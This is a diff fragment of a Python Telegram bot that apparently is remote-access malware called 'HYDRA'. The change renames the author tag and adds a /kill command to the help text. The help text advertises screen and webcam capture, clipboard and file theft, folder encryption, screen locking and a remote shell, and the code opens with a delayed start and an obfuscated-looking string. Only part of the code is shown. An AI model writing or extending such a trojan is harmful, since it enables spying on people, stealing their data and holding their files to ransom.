@@ -15,7 +15,7 @@ import requests
 from time import sleep
 
 sleep(60)
-Author="HARSHV_2003"
+Author="HARSHV_HYDRA_2003"
 sum=0
 a="ab________rjgrghrjghrjgrjgirghbirugbrughrughrg=="
 b=434434
@@ -65,7 +65,7 @@ def kill(message):
 
 @bot.message_handler(commands=['help'])
 def help_msg(message):
-    help_text = 'Send /screen to capture screenshot.\n/sys to get system information.\n/ip to get ip adress.\n/cd to navigate in folders. \n/ls for list élements. \n/upload [path] to get file.\n/crypt [path] for crypt folders files. /decrypt [path] \n/webcam \n/lock \n /clipboard \n/shell \n/speech [hi] \n/shutdown'
+    help_text = 'Send /screen to capture screenshot.\n/sys to get system information.\n/ip to get ip adress.\n/cd to navigate in folders. \n/ls for list élements. \n/upload [path] to get file.\n/crypt [path] for crypt folders files. /decrypt [path] \n/webcam \n/lock \n /clipboard \n/shell \n/speech [hi] \n/shutdown \n /kill to terminate HYDRA'
     bot.send_message(message.chat.id, help_text)
 
 @bot.message_handler(commands=['screen'])
